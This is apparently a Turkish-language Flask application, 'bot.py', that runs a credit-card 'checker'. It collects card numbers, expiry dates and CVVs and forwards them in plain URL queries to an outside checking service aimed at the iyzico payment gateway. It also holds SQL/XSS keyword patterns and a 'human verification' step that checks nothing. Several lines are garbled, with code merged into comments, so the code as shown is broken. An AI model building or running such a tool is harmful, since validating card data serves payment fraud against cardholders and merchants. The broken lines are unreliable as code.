# bot.py
from flask import (
    Flask, render_template, request, jsonify, session,
    redirect, url_for, make_response
)
from flask_limiter import Limiter                                                from flask_limiter.util import get_remote_address
from functools import wraps
from datetime import datetime, timedelta
import os, time, re, random, string, requests, hashlib

# ---- App ----
app = Flask(__name__, template_folder='templates', static_folder=None)
app.secret_key = os.urandom(24)
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=1)

# ---- Rate limiting (DDoS koruması) ----
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour", "10 per minute"]
)

# ---- Enhanced IP attempt throttling ----
ip_attempts = {}
def check_ip_security(ip, window_seconds=60, max_attempts=10):
    now = time.time()
    data = ip_attempts.get(ip)
    if not data:
        ip_attempts[ip] = {'count': 1, 'first': now, 'last_attempt': now}
        return True

    # Reset if window has passed                                                     if now - data['first'] > window_seconds:
        ip_attempts[ip] = {'count': 1, 'first': now, 'last_attempt': now}
        return True
                                                                                     # Check if too many attempts
    data['count'] += 1
    data['last_attempt'] = now

    if data['count'] > max_attempts:
        # Calculate wait time (progressive penalty)
        wait_time = min(window_seconds * 2, 3600)  # Max 1 hour wait
        return False

    return True

# ---- Session fingerprinting ----
def get_client_fingerprint():
    """Create a fingerprint based on client characteristics"""
    user_agent = request.headers.get('User-Agent', '')
    accept_language = request.headers.get('Accept-Language', '')
    accept_encoding = request.headers.get('Accept-Encoding', '')                 
    fingerprint_string = f"{user_agent}{accept_language}{accept_encoding}"
    return hashlib.sha256(fingerprint_string.encode()).hexdigest()

def validate_session_security():
    """Validate session integrity"""
    if not session.get('human_verified'):
        return False

    # Check session fingerprint
    current_fingerprint = get_client_fingerprint()
    if session.get('client_fingerprint') != current_fingerprint:
        session.clear()
        return False

    # Check session age
    session_created = session.get('session_created')
    if session_created:
        if time.time() - session_created > 3600:  # 1 hour max
            session.clear()
            return False

    return True

# ---- Input sanitization (SQL/XSS patterns) ----
SQL_XSS_PATTERNS = [
    r'(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|EXEC|ALTER|CREATE|TRUNCATE)\b)',
    r'(\b(OR|AND)\b.*=)',
    r'(\b(SLEEP|WAITFOR|DELAY)\b)',
    r'(--|#|\/\*)',
    r'(\b(SCRIPT|JAVASCRIPT|ONLOAD)\b)',
    r'(<\s*script)'
]

def sanitize_input(s: str) -> str:
    if not s:
        return ""
    for p in SQL_XSS_PATTERNS:
        if re.search(p, s, flags=re.IGNORECASE):
            return "BLOCKED"
    # only keep digits for card fields
    return re.sub(r'[^0-9]', '', s)

# ---- Enhanced Decorator: must be robot-verified (session) ----
def human_verified_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not validate_session_security():
            return redirect(url_for('robot'))
        return f(*args, **kwargs)
    return wrapper

# ---- Routes ----
@app.route('/robot')
def robot():
    return render_template('robot_dogrulama.html')

@app.route('/verify_human', methods=['POST'])
def verify_human():
    # Enhanced session creation with fingerprint
    session['human_verified'] = True
    session.permanent = True
    session['client_fingerprint'] = get_client_fingerprint()
    session['session_created'] = time.time()
    session['last_activity'] = time.time()

    # Set a CSRF token for form protection                                           session['csrf_token'] = hashlib.sha256(os.urandom(32)).hexdigest()

    return jsonify({'status': 'success', 'message': 'Doğrulama başarılı'})

@app.route('/')
@human_verified_required
def index():
    # Update last activity
    session['last_activity'] = time.time()
    return render_template('index.html', csrf_token=session.get('csrf_token'))

# ---- Protected API endpoint with enhanced security ----
@app.route('/api/check_cc', methods=['POST'])
@limiter.limit("5 per minute")
@human_verified_required
def api_check_cc():
    client_ip = get_remote_address()

    # Enhanced IP throttling
    if not check_ip_security(client_ip):
        return jsonify({'status': 'error', 'message': 'Çok fazla istek yapıldı. Lütfen bekleyin.'}), 429

    # Update last activity
    session['last_activity'] = time.time()

    # CSRF protection                                                                data = request.get_json(silent=True)
    if not data:
        return jsonify({'status':'error','message':'Geçersiz JSON verisi'}), 400

    # Verify CSRF token
    csrf_token = data.get('csrf_token')
    if not csrf_token or csrf_token != session.get('csrf_token'):
        return jsonify({'status':'error','message':'Güvenlik hatası. Lütfen sayfayı yenileyin.'}), 403
                                                                                     # Input validation
    cc_number = sanitize_input(str(data.get('cc_number', '') or data.get('cc', '') or ''))
    exp_month = sanitize_input(str(data.get('exp_month', '') or data.get('ay', '') or ''))
    exp_year = sanitize_input(str(data.get('exp_year', '') or data.get('yil', '') or ''))
    cvv = sanitize_input(str(data.get('cvv', '') or ''))

    # Security pattern detection
    if any(x == "BLOCKED" for x in [cc_number, exp_month, exp_year, cvv]):
        return jsonify({'status':'error','message':'Güvenlik ihlali tespit edildi'}), 403

    # Enhanced validation
    if not all([cc_number, exp_month, exp_year, cvv]):
        return jsonify({'status':'error','message':'Tüm alanlar gereklidir'}), 400

    if len(cc_number) < 15 or len(cc_number) > 16:
        return jsonify({'status':'error','message':'Geçersiz kart numarası uzunluğu'}), 400

    try:
        m = int(exp_month)
        if m < 1 or m > 12 or len(exp_month) != 2:
            raise ValueError()                                                       except Exception:
        return jsonify({'status':'error','message':'Geçersiz son kullanma ayı'}), 400

    if len(exp_year) != 2:
        return jsonify({'status':'error','message':'Geçersiz son kullanma yılı'}), 400

    if len(cvv) not in (3,4):
        return jsonify({'status':'error','message':'Geçersiz CVV'}), 400

    # Forward to external API
    external_api = f"https://nabi-checker.onrender.com/iyzico?cc={cc_number}&ay={exp_month}&yil={exp_year}&cvv={cvv}"
    try:
        resp = requests.get(external_api, timeout=15)
        try:
            rjson = resp.json()
            return jsonify({'status':'ok','result': rjson})
        except Exception:
            return jsonify({'status':'ok','result_text': resp.text})
    except requests.RequestException as e:
        return jsonify({'status':'error','message':f'API bağlantı hatası: {str(e)}'}), 502

# ---- Session cleanup endpoint ----
@app.route('/api/logout', methods=['POST'])
def logout():
    session.clear()
    return jsonify({'status': 'success', 'message': 'Çıkış yapıldı'})

# ---- After-request security headers ----
@app.after_request
def set_security_headers(response):
    csp = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';"
    response.headers['Content-Security-Policy'] = csp
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, private'
    return response

# ---- Error handlers ----
@app.errorhandler(404)
def not_found(e):
    return jsonify({'status':'error','message':'Sayfa bulunamadı'}), 404

@app.errorhandler(429)
def ratelimit(e):
    return jsonify({'status':'error','message':'İstek limiti aşıldı'}), 429

@app.errorhandler(500)
def internal(e):
    return jsonify({'status':'error','message':'Sunucu hatası oluştu'}), 500

# ---- Run ----
if __name__ == "__main__":
    try:
        import requests as _r
    except ImportError:
        os.system("pip install requests")
    print("Sunucu başlatılıyor: http://0.0.0.0:5000")
    app.run(host='0.0.0.0', port=5000, debug=False)
